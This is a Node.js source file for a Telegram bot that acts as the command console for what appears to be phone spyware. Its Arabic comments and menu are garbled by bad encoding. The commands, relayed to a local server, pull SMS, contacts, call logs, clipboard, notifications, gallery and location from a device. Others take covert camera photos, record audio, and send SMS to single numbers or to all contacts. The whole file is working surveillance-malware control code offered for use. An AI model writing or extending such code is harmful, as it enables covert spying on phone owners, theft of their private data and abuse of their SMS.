const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const config = require('./config');

class TelegramControlBot {
    constructor() {
        this.bot = new TelegramBot(config.TELEGRAM.TOKEN, { polling: true });
        this.serverUrl = `http://localhost:${config.SERVER.PORT}`;
        this.setupBot();
    }

    setupBot() {
        console.log('๐ ุจูุช ุงูุชูุฌุฑุงู ูุนูู...');

        // โ ุงูุชุญูู ูู ุงููููุฉ
        this.bot.on('message', (msg) => {
            if (msg.chat.id.toString() !== config.TELEGRAM.CHAT_ID) {
                this.bot.sendMessage(msg.chat.id, 'โ ุบูุฑ ูุตุฑุญ ุจุงูุฏุฎูู');
                return;
            }
        });

        // ๐ฏ ุงูุฃูุฑ ุงูุฑุฆูุณู
        this.bot.onText(/\/start/, (msg) => {
            this.showMainMenu(msg.chat.id);
        });

        // ๐ฆ ุงูููุฒุงุช ุงูุฃุณุงุณูุฉ
        this.bot.onText(/\/flashlight_(on|off)/, (msg, match) => {
            this.sendCommand(msg.chat.id, 'flashlight', { state: match[1] === 'on' });
        });

        this.bot.onText(/\/vibrate/, (msg) => {
            this.sendCommand(msg.chat.id, 'vibrate', { duration: 1000 });
        });

        this.bot.onText(/\/toast (.+)/, (msg, match) => {
            this.sendCommand(msg.chat.id, 'toast', { message: match[1] });
        });

        this.bot.onText(/\/play_sound (.+)/, (msg, match) => {
            this.sendCommand(msg.chat.id, 'play_sound', { url: match[1] });
        });

        // ๐ฑ ูุนูููุงุช ุงูุฌูุงุฒ
        this.bot.onText(/\/device_info/, (msg) => {
            this.sendCommand(msg.chat.id, 'device_info');
        });

        this.bot.onText(/\/get_clipboard/, (msg) => {
            this.sendCommand(msg.chat.id, 'get_clipboard');
        });

        // โ๏ธ ุงูุฑุณุงุฆู
        this.bot.onText(/\/get_sms/, (msg) => {
            this.sendCommand(msg.chat.id, 'get_sms');
        });

        this.bot.onText(/\/send_sms (.+) (.+)/, (msg, match) => {
            this.sendCommand(msg.chat.id, 'send_sms', { 
                number: match[1], 
                message: match[2] 
            });
        });

        this.bot.onText(/\/send_sms_to_all (.+)/, (msg, match) => {
            this.sendCommand(msg.chat.id, 'send_sms_to_all', { 
                message: match[1] 
            });
        });

        // ๐ฅ ุฌูุงุช ุงูุงุชุตุงู
        this.bot.onText(/\/get_contacts/, (msg) => {
            this.sendCommand(msg.chat.id, 'get_contacts');
        });

        this.bot.onText(/\/get_call_logs/, (msg) => {
            this.sendCommand(msg.chat.id, 'get_call_logs');
        });

        // ๐ท ุงููุณุงุฆุท
        this.bot.onText(/\/camera_(front|back)/, (msg, match) => {
            this.sendCommand(msg.chat.id, 'camera_capture', { 
                camera_type: match[1] 
            });
        });

        this.bot.onText(/\/record_audio (.+)/, (msg, match) => {
            this.sendCommand(msg.chat.id, 'record_audio', { 
                duration: parseInt(match[1]) 
            });
        });

        this.bot.onText(/\/get_gallery/, (msg) => {
            this.sendCommand(msg.chat.id, 'get_gallery');
        });

        // ๐ ุงููููุน ูุงูุฅุดุนุงุฑุงุช
        this.bot.onText(/\/get_location/, (msg) => {
            this.sendCommand(msg.chat.id, 'get_location');
        });

        this.bot.onText(/\/get_notifications/, (msg) => {
            this.sendCommand(msg.chat.id, 'get_notifications');
        });

        this.bot.onText(/\/send_notification (.+) (.+)/, (msg, match) => {
            this.sendCommand(msg.chat.id, 'send_notification', { 
                title: match[1], 
                message: match[2] 
            });
        });

        // ๐ ุงููุชุตูุญ
        this.bot.onText(/\/open_url (.+)/, (msg, match) => {
            this.sendCommand(msg.chat.id, 'open_url', { 
                url: match[1] 
            });
        });

        // ๐ ุงูุฎูููุฉ
        this.bot.onText(/\/change_wallpaper/, (msg) => {
            this.sendCommand(msg.chat.id, 'change_wallpaper');
        });
    }

    async sendCommand(chatId, command, parameters = {}) {
        try {
            this.bot.sendMessage(chatId, `๐ ุฌุงุฑู ุชูููุฐ: ${command}...`);

            const response = await axios.post(`${this.serverUrl}/api/command`, {
                command: command,
                parameters: parameters,
                timestamp: Date.now()
            });

            if (response.data.status === 'success') {
                this.bot.sendMessage(chatId, `โ ุชู ุชูููุฐ: ${command}`);
            } else {
                this.bot.sendMessage(chatId, `โ ูุดู: ${response.data.message}`);
            }

        } catch (error) {
            this.bot.sendMessage(chatId, `โ ุฎุทุฃ ูู ุงูุงุชุตุงู: ${error.message}`);
        }
    }

    showMainMenu(chatId) {
        const menu = `
๐ฏ *ูุธุงู ุงูุชุญูู ูู ุงูููุงุชู ุนุจุฑ ุงูุชูุฌุฑุงู*

๐ฆ *ุงูููุฒุงุช ุงูุฃุณุงุณูุฉ:*
/flashlight_on - ุชุดุบูู ุงูุดุนูุฉ
/flashlight_off - ุฅููุงู ุงูุดุนูุฉ  
/vibrate - ุงูุชุฒุงุฒ ุงูุฌูุงุฒ
/toast [ูุต] - ุนุฑุถ ุฑุณุงูุฉ ุชูุณุช
/play_sound [ุฑุงุจุท] - ุชุดุบูู ุตูุช
/device_info - ูุนูููุงุช ุงูุฌูุงุฒ
/get_clipboard - ูุต ุงูุญุงูุธุฉ
/change_wallpaper - ุชุบููุฑ ุงูุฎูููุฉ

โ๏ธ *ุงูุฑุณุงุฆู ูุงูุงุชุตุงูุงุช:*
/get_sms - ุงุณุชูุจุงู ุงูุฑุณุงุฆู
/send_sms [ุฑูู] [ุฑุณุงูุฉ] - ุฅุฑุณุงู ุฑุณุงูุฉ
/send_sms_to_all [ุฑุณุงูุฉ] - ุฅุฑุณุงู ููุฌููุน
/get_contacts - ุฌูุงุช ุงูุงุชุตุงู
/get_call_logs - ุณุฌูุงุช ุงูููุงููุงุช
/get_notifications - ุงูุฅุดุนุงุฑุงุช

๐ท *ุงููุณุงุฆุท:*
/camera_front - ูุงููุฑุง ุฃูุงููุฉ
/camera_back - ูุงููุฑุง ุฎูููุฉ
/record_audio [ุซูุงูู] - ุชุณุฌูู ุตูุช
/get_gallery - ูุนุฑุถ ุงูุตูุฑ

๐ *ุฃุฎุฑู:*
/get_location - ูููุน ุงูุฌูุงุฒ
/open_url [ุฑุงุจุท] - ูุชุญ ุฑุงุจุท
/send_notification [ุนููุงู] [ุฑุณุงูุฉ] - ุฅุฑุณุงู ุฅุดุนุงุฑ

๐ก *ุทุฑููุฉ ุงูุงุณุชุฎุฏุงู:*
ุฃุฑุณู ุงูุฃูุฑ ูุจุงุดุฑุฉ ูุซู:
/toast ูุฑุญุจุง ุจุงูุนุงูู
/send_sms 1234567890 Hello
        `;

        this.bot.sendMessage(chatId, menu, { parse_mode: 'Markdown' });
    }
}

// ุชุดุบูู ุงูุจูุช
new TelegramControlBot();
